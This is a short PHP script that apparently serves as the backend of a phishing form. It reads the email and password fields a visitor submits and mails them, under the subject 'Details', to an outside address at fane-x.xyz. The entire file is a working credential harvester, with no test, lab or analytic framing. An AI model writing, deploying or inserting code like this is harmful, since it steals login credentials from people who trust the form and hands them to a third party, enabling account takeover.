<?php
    $to      = 'noreply@fane-x.xyz';
    $subject = 'Details';
        //set message as email and password
    $message = 'Email: ' . $_POST['email'] . ' Password: ' . $_POST['password'];
    $headers = 
                'X-Mailer: PHP/' . phpversion();
    mail($to, $subject, $message, $headers);


?>
